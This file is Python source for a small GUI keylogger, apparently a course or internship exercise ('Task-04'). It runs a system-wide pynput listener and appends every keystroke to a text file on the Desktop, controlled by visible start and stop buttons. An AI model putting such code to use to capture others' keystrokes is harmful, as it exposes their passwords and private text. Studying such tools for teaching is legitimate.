import customtkinter as ctk
from pynput import keyboard
import os

# VS Code Theme
VS_BLUE = "#007ACC"
VS_DARK = "#1E1E1E"

class KeyloggerApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Task-04: Simple Keylogger")
        self.geometry("450x300")
        self.configure(fg_color=VS_DARK)

        # UI Setup
        self.header = ctk.CTkLabel(self, text="Keystroke Logger", font=("Segoe UI", 24, "bold"), text_color=VS_BLUE)
        self.header.pack(pady=20)

        self.status_indicator = ctk.CTkLabel(self, text="Status: IDLE", font=("Consolas", 14), text_color="#888888")
        self.status_indicator.pack(pady=5)

        self.btn_start = ctk.CTkButton(self, text="Start Logging", fg_color=VS_BLUE, command=self.start_logging)
        self.btn_start.pack(pady=10)

        self.btn_stop = ctk.CTkButton(self, text="Stop & Save", fg_color="#CC3333", command=self.stop_logging, state="disabled")
        self.btn_stop.pack(pady=10)

        # Logger variables
        self.log_file = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")
        self.listener = None

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                # Handle standard characters
                f.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file, "a") as f:
                # Handle special keys (Space, Enter, etc.)
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(f" [{key}] ")

    def start_logging(self):
        self.status_indicator.configure(text="Status: ACTIVE", text_color="#55FF55")
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        
        # Start the listener in the background
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
        
        self.status_indicator.configure(text="Status: SAVED", text_color=VS_BLUE)
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        print(f"Log saved to: {self.log_file}")

if __name__ == "__main__":
    app = KeyloggerApp()
    app.mainloop()